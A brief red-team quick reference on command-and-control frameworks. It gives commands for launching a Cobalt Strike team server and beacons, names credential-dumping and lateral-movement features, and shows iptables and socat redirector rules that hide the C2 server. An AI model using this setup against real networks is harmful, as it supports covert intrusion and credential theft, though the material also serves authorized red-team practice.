# C2 Frameworks Quick Reference

## Cobalt Strike
```bash
# Start team server
./teamserver <IP> <password> [killdate] [profile]
# Connect client
./cobaltstrike   # enter host, user, password
```
- **Listener**: Cobalt Strike > Listeners > Add (HTTP/HTTPS/DNS/SMB)
- **Payload**: Attacks > Packages > Windows Executable (Stageless)
- **Beacon**: implant that calls back to team server on interval
- Key commands: `shell`, `powershell`, `upload`, `download`, `mimikatz`, `hashdump`
- Lateral: `psexec`, `wmi`, `winrm`, `dcom` built-in
- Always use redirectors in front of team server

## PowerShell Empire
- Python-based C2 with PS/C#/Python agents
- Modules for privesc, lateral movement, credential access
- Stagers generate payloads; listeners handle callbacks

## Redirectors / Forwarders
```bash
# iptables HTTP redirector (forward 80 -> team server)
iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination TEAMSERVER:80
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1
```
```bash
# socat alternative
socat TCP4-LISTEN:80,fork TCP4:TEAMSERVER:80
```
- Purpose: hide team server IP; disposable if burned
